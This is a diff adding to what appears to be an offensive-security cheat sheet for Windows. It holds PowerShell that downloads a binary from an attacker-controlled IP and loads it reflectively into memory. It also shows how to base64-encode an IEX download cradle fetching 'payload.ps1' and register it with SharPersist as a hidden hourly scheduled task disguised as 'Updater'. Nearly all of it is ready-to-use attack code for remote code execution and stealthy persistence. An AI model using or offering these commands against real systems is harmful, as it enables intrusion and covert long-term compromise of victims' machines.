@@ -15,5 +15,22 @@ Binary reflective loading
 ```csharp
 $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/binary.exe')
 $assem = [System.Reflection.Assembly]::Load($data)
-[rev.Program]::Main("".Split())
+[binary.Program]::Main("".Split())
+```
+
+
+
+##Presistance 
+
+###Task Scheduler
+
+Using SharpPresist
+
+```powershell
+$str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.10.10/payload.ps1"))'
+[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+```
+The above snippet will produce a Base64 string which will be supplied in the snippet below:
+```powershell
+.\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc BASE64 ENCODED STRING HERE" -n "Updater" -m add -o hourly
 ```
